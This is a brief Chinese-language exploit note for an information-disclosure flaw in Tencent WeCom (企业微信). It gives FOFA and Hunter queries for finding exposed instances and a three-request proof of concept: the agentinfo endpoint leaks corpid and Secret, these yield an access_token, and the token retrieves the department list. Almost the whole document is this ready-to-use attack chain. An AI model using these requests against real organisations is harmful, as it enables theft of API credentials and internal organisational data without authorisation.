# 腾讯 企业微信 agentinfo 信息泄漏漏洞

## 网络测绘

fofa: app="Tencent-企业微信"

hunter: app.name="腾讯企业邮箱"

## POC / EXP

```
# 通过API接口获取corpid和Secret
/cgi-bin/gateway/agentinfo

# 通过corpid和Secret构造请求获取access_token调用接口凭证
/cgi-bin/gettoken?corpid={corpid}&corpsecret={Secret}

# 通过access_token调用接口凭证获取部门列表
/cgi-bin/department/list?access_token={access_token}
```

```
https://developer.work.weixin.qq.com/document/path/91039
```